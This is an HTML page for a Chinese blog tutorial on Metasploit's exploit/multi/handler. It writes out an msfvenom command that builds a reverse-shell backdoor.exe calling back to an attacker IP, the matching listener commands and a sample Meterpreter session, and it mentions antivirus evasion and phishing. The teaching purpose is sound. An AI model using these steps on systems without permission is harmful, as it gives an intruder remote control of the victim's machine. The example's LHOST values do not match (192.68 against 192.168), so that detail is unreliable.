@@ -1,0 +1,606 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Metasploit exploit/multi/handler 模块详解 | 1024 维度</title><meta name="author" content="TeaTang"><meta name="copyright" content="TeaTang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="exploit&#x2F;multi&#x2F;handler 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的监听器（Listener），用于接收由 Metasploit 或 msfvenom 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit exploit&#x2F;multi&#x2F;handler 模块详解">
+<meta property="og:url" content="https://blog.tbf1211.xx.kg/08a7bab723f9/index.html">
+<meta property="og:site_name" content="1024 维度">
+<meta property="og:description" content="exploit&#x2F;multi&#x2F;handler 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的监听器（Listener），用于接收由 Metasploit 或 msfvenom 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Me">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-30.jpg">
+<meta property="article:published_time" content="2025-02-13T22:24:00.000Z">
+<meta property="article:modified_time" content="2025-11-21T14:52:45.541Z">
+<meta property="article:author" content="TeaTang">
+<meta property="article:tag" content="计算机网络">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="2025">
+<meta property="article:tag" content="Metasploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-30.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Metasploit exploit/multi/handler 模块详解",
+  "url": "https://blog.tbf1211.xx.kg/08a7bab723f9/",
+  "image": "https://blog.tbf1211.xx.kg/img/cover/default_cover-30.jpg",
+  "datePublished": "2025-02-13T22:24:00.000Z",
+  "dateModified": "2025-11-21T14:52:45.541Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "TeaTang",
+      "url": "https://blog.tbf1211.xx.kg"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon-1.ico"><link rel="canonical" href="https://blog.tbf1211.xx.kg/08a7bab723f9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><meta name="google-site-verification" content="NdIUXAOVyGnnBhcrip0ksCawbdAzT0hlBZDE9u4jx6k"/><meta name="msvalidate.01" content="567E47D75E8DCF1282B9623AD914701E"/><meta name="baidu-site-verification" content="code-pE5rnuxcfD"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: TeaTang","link":"链接: ","source":"来源: 1024 维度","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Metasploit exploit/multi/handler 模块详解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://jsd.012700.xyz"><link href="/self/btf.css" rel="stylesheet"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="1024 维度" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">306</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">199</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">69</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover/default_cover-30.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">1024 维度</span></a><a class="nav-page-title" href="/"><span class="site-name">Metasploit exploit/multi/handler 模块详解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit exploit/multi/handler 模块详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2025-02-13T22:24:00.000Z" title="发表于 2025-02-14 06:24:00">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="umamiPV" data-path="/08a7bab723f9/"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p><strong><code>exploit/multi/handler</code></strong> 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的<strong>监听器（Listener）</strong>，用于接收由 Metasploit 或 <code>msfvenom</code> 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Meterpreter 会话。</p>
+</blockquote>
+<div class="note info flat"><p>核心思想：<strong>提供一个通用的、模块化的监听接口，等待远程目标系统主动连接，从而建立一个控制通道。它与用于生成Payload的<code>msfvenom</code>紧密配合，实现无缝的端到端攻击链。</strong></p>
+</div>
+<hr>
+<h2 id="一、exploit-multi-handler-简介"><a href="#一、exploit-multi-handler-简介" class="headerlink" title="一、exploit/multi/handler 简介"></a>一、<code>exploit/multi/handler</code> 简介</h2><h3 id="1-1-什么是-exploit-multi-handler？"><a href="#1-1-什么是-exploit-multi-handler？" class="headerlink" title="1.1 什么是 exploit/multi/handler？"></a>1.1 什么是 <code>exploit/multi/handler</code>？</h3><p><code>exploit/multi/handler</code> 是 Metasploit 中的一个<strong>混合型模块 (Auxiliary&#x2F;Exploit)</strong>。它被归类为 <code>exploit</code>，因为它最终目的是“利用”系统并获得 Shell，但它实际上不包含任何漏洞利用代码。它的主要功能是：</p>
+<ol>
+<li><strong>监听反向连接 (Reverse Connections)</strong>：在本地主机上开启一个监听端口，等待由远程目标系统（受害者）发起的 TCP 或 UDP 连接。</li>
+<li><strong>处理 Payload</strong>：当连接建立后，<code>handler</code> 会处理接收到的 Payload，并与目标系统建立一个交互式的会话（如 Meterpreter 会话、命令行 Shell 等）。</li>
+<li><strong>通用性</strong>：它之所以被称为 <code>multi</code>，是因为它可以与 Metasploit 支持的几乎<strong>所有类型的反向 Payload</strong> 配合使用，无论是 Windows、Linux、macOS 还是 Android 平台的，也无论是 Meterpreter、Command Shell 还是其他自定义 Payload。</li>
+</ol>
+<h3 id="1-2-为什么需要-handler？"><a href="#1-2-为什么需要-handler？" class="headerlink" title="1.2 为什么需要 handler？"></a>1.2 为什么需要 <code>handler</code>？</h3><p>在大多数渗透测试场景中，攻击目标通常位于防火墙或 NAT 后面，直接从外部向目标发起连接（Bind Shell）往往会因为防火墙的阻挡而失败。反向连接 (Reverse Shell) 是解决这个问题的有效方法，因为它利用了防火墙通常允许内部网络到外部网络的出站连接的特性。</p>
+<p><code>handler</code> 就是为了接收这些出站的反向连接而设计的。它充当攻击机的“指挥中心”，稳定地等待、接收和管理这些由受害机器主动回连的会话。</p>
+<h2 id="二、exploit-multi-handler-的配置与使用"><a href="#二、exploit-multi-handler-的配置与使用" class="headerlink" title="二、exploit/multi/handler 的配置与使用"></a>二、<code>exploit/multi/handler</code> 的配置与使用</h2><p>使用 <code>exploit/multi/handler</code> 的常规步骤是在 <code>msfconsole</code> 中进行。</p>
+<h3 id="2-1-基本使用步骤"><a href="#2-1-基本使用步骤" class="headerlink" title="2.1 基本使用步骤"></a>2.1 基本使用步骤</h3><ol>
+<li><p><strong>启动 <code>msfconsole</code></strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>选择 <code>handler</code> 模块</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置 Payload (必须与目标 Payload 匹配)</strong>：<br>这是最关键的一步。<code>handler</code> 需要知道它正在监听的是哪种类型的 Payload，以便正确地处理接收到的连接。因此，这里设置的 Payload 必须<strong>精确</strong>匹配你在 <code>msfvenom</code> 中生成 Payload 时使用的那一个。</p>
+<p>例如，如果你用 <code>msfvenom -p windows/meterpreter/reverse_tcp ...</code> 生成了 Payload，那么这里也要设置同样的 Payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置 LHOST (监听主机 IP)</strong>：<br><code>LHOST</code> 是攻击机上监听连接的 IP 地址。这个 IP 地址必须是目标机器能够访问到的。如果你有多块网卡，请选择正确的 IP 地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100  <span class="comment"># 替换为你的攻击机实际IP</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置 LPORT (监听端口)</strong>：<br><code>LPORT</code> 是攻击机上监听连接的端口。这个端口必须是开放的，且没有被其他程序占用。在生成 Payload 时，Payload 中也需要指定回连到这个 LPORT。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> LPORT 4444  <span class="comment"># 替换为你生成Payload时使用的端口</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>检查选项</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p>确认 <code>LHOST</code> 和 <code>LPORT</code> 都已正确设置，并且 <code>Payload</code> 与你预期的匹配。</p>
+</li>
+<li><p><strong>启动监听器</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line"><span class="comment"># 或者 run</span></span><br></pre></td></tr></table></figure>
+<p>此时 <code>handler</code> 开始在 <code>LHOST:LPORT</code> 上监听传入连接。它会显示“Started reverse TCP handler on …”之类的消息。</p>
+</li>
+<li><p><strong>等待会话</strong>：<br>现在，当目标机器执行你之前生成的恶意 Payload 时，它会尝试回连到你的 <code>LHOST:LPORT</code>。一旦连接成功，<code>msfconsole</code> 就会显示“Meterpreter session X opened …”或“Shell session X opened …”的消息，表明你已成功获取远程 Shell。</p>
+</li>
+</ol>
+<h3 id="2-2-示例-结合-msfvenom"><a href="#2-2-示例-结合-msfvenom" class="headerlink" title="2.2 示例 (结合 msfvenom)"></a>2.2 示例 (结合 <code>msfvenom</code>)</h3><ol>
+<li><p><strong>在攻击机 (192.168.1.100) 上生成 Payload (使用 <code>msfvenom</code>)</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.68.1.100 LPORT=4444 -f exe -o /root/Desktop/backdoor.exe</span><br></pre></td></tr></table></figure>
+<p>这会在 <code>/root/Desktop</code> 下生成一个名为 <code>backdoor.exe</code> 的 Windows 可执行文件。</p>
+</li>
+<li><p><strong>在攻击机上启动 <code>msfconsole</code> 并配置 <code>handler</code></strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>将 <code>backdoor.exe</code> 传输到目标 Windows 机器并执行</strong>：<br>（假设目标机器的 IP 是 192.168.1.50）</p>
+</li>
+<li><p><strong>在 <code>msfconsole</code> 中接收会话</strong>：<br>当 <code>backdoor.exe</code> 在目标机器上成功运行后，<code>msfconsole</code> 会显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.1.100:4444</span><br><span class="line">[*] Sending stage (175680 bytes) to 192.168.1.50</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.100:4444 -&gt; 192.168.1.50:port) at 2024-03-01 06:24:00 +0800</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>此时，你已经获得了 Meterpreter 会话，可以开始进行后渗透操作了。</p>
+</li>
+</ol>
+<h3 id="2-3-handler-的高级选项"><a href="#2-3-handler-的高级选项" class="headerlink" title="2.3 handler 的高级选项"></a>2.3 <code>handler</code> 的高级选项</h3><p>虽然 <code>handler</code> 的主要参数是 <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>，但它也有一些其他有用的通用选项：</p>
+<ul>
+<li><strong><code>ExitOnSession</code></strong>：当获得第一个会话后，是否自动退出 <code>handler</code>。<ul>
+<li><strong><code>set ExitOnSession false</code></strong>：这允许 <code>handler</code> 在获得会话后继续监听，以便接收来自其他目标或同一目标的多个会话。这在进行大规模钓鱼或多目标渗透测试时非常有用。</li>
+</ul>
+</li>
+<li><strong><code>ReverseAllowProxy</code></strong>：允许通过代理接收反向连接。</li>
+<li><strong><code>ReverseListenerBindAddress</code></strong> 和 <strong><code>ReverseListenerBindPort</code></strong>：用于指定 <code>handler</code> 实际绑定到哪个本地 IP 地址和端口进行监听。这在有多块网卡或需要监听特定接口时非常有用（通常与 <code>LHOST</code> 相同，但在复杂网络环境中可能不同）。</li>
+</ul>
+<h2 id="三、exploit-multi-handler-与其他模块的关系"><a href="#三、exploit-multi-handler-与其他模块的关系" class="headerlink" title="三、exploit/multi/handler 与其他模块的关系"></a>三、<code>exploit/multi/handler</code> 与其他模块的关系</h2><div class="mermaid-wrap"><pre class="mermaid-src" data-config="{}" hidden>
+    graph TD
+    subgraph Attacker Workflow
+        A[msfvenom - Generate Payload] --&gt; B[exploit&#x2F;multi&#x2F;handler - Set Listener]
+    end
+
+    subgraph Defense Bypass
+        B --&gt; C{Target Execution of Payload}
+    end
+
+    subgraph Session Management
+        C -- If successful --&gt; D[Meterpreter&#x2F;Shell Session]
+        D --&gt; E[Post-Exploitation Modules]
+    end
+
+    style A fill:#aed,stroke:#333,stroke-width:2px,color:#000
+    style B fill:#baf,stroke:#333,stroke-width:2px,color:#000
+    style D fill:#fad,stroke:#333,stroke-width:2px,color:#000
+  </pre></div>
+
+<p><code>exploit/multi/handler</code> 在整个 Metasploit 渗透测试工作流中扮演着承上启下的关键角色：</p>
+<ol>
+<li><p><strong>与 <code>msfvenom</code> 配合</strong>：</p>
+<ul>
+<li><code>msfvenom</code> 负责生成恶意二进制文件、Web Shell、Shellcode 等各种形式的 Payload，这些 Payload 中包含了回连到 <code>handler</code> 的代码。</li>
+<li><code>handler</code> 则负责接收这些 <code>msfvenom</code> 生成的 Payload 的回连。两者是天作之合，共同实现了反向 Shell 的完整流程。</li>
+</ul>
+</li>
+<li><p><strong>管理会话</strong>：</p>
+<ul>
+<li>一旦 <code>handler</code> 成功接收连接并建立会话（如 Meterpreter 会话），攻击者就可以使用 <code>sessions</code> 命令来查看、切换和管理这些会话。</li>
+<li><code>handler</code> 可以同时管理多个会话，如果设置 <code>ExitOnSession false</code>，它甚至可以在一个会话关闭后继续监听新的回连。</li>
+</ul>
+</li>
+<li><p><strong>后渗透阶段的基础</strong>：</p>
+<ul>
+<li>获取会话后，<code>handler</code> 将控制权交给 Meterpreter 或 Shell，此时可以加载 <code>post</code> 模块，进行信息收集、提权、权限维持、横向移动等一系列后渗透操作。</li>
+</ul>
+</li>
+<li><p><strong>与传统 <code>exploit</code> 模块的区别</strong>：</p>
+<ul>
+<li>传统的 <code>exploit</code> 模块（如 <code>exploit/windows/smb/ms17_010_eternalblue</code>）既包含漏洞利用代码，也通常内置了一个处理 Payload 的监听器。当 Exploit 成功时，它会自动处理 Payload 并建立会话。</li>
+<li><code>exploity/multi/handler</code> 则是一个独立的监听器，它不包含任何 Exploit 代码，需要你通过其他方式（例如 <code>msfvenom</code> 生成的独立程序、命令注入、Web Shell 等）将 Payload 部署到目标机器并执行。</li>
+</ul>
+</li>
+</ol>
+<h2 id="四、安全注意事项"><a href="#四、安全注意事项" class="headerlink" title="四、安全注意事项"></a>四、安全注意事项</h2><p>使用 <code>exploit/multi/handler</code> 时，需要注意以下安全事项：</p>
+<ol>
+<li><strong>LHOST 的可访问性</strong>：确保 <code>LHOST</code> 设置为可被目标机器访问的 IP 地址。如果攻击机在 NAT 后面，可能需要进行端口转发或使用具有公网 IP 的 VPS。</li>
+<li><strong>LPORT 的占用</strong>：确保 <code>LPORT</code> 没有被攻击机上的其他程序占用。</li>
+<li><strong>防火墙&#x2F;安全组</strong>：确保攻击机上的防火墙或云平台的安全组允许目标机器回连到 <code>LPORT</code>。</li>
+<li><strong>Payload 匹配</strong>：Payload 的类型、LHOST 和 LPORT 必须与 <code>handler</code> 中设置的完全一致，否则连接将无法正确建立或处理。</li>
+<li><strong>Payload 免杀</strong>：<code>msfvenom</code> 生成的 Payload 签名可能已被主流杀毒软件识别。在实际渗透测试中，需要结合自定义编码、加密、Shellcode loader 等高级免杀技术来绕过杀毒软件。</li>
+<li><strong>合规性</strong>：仅在授权的渗透测试或合法研究中使用此工具。未经授权使用是违法行为。</li>
+</ol>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p><code>exploit/multi/handler</code> 是 Metasploit 框架中一个不可或缺的通用监听器，它是实现反向 Shell 的核心组件。它通过提供一个灵活的平台来接收和管理由 <code>msfvenom</code> 或其他方式生成的恶意 Payload 的回连，极大地简化了渗透测试人员的工作流程。无论是进行简单的命令行Shell控制，还是复杂的Meterpreter会话管理，<code>handler</code>都为后续的后渗透活动提供了坚实的基础。熟练掌握 <code>exploit/multi/handler</code> 的使用，是成为合格渗透测试工程师的关键一步。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg">TeaTang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg/08a7bab723f9/">https://blog.tbf1211.xx.kg/08a7bab723f9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.tbf1211.xx.kg" target="_blank">1024 维度</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/2025/">2025</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover-30.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/1beef2825d33/" title="CMake 与 Make：构建系统之辨"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-20.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CMake 与 Make：构建系统之辨</div></div><div class="info-2"><div class="info-item-1"> 在 C&#x2F;C++ 等编译型语言的开发中，构建系统 (Build System) 是将源代码转换成可执行程序、库或其他目标文件的核心环节。CMake 和 Make 是其中两个最常用但职责不同的工具。简单来说，CMake 是一个高级的构建系统生成器 (Build System Generator)，而 Make 是一个低级的构建工具 (Build 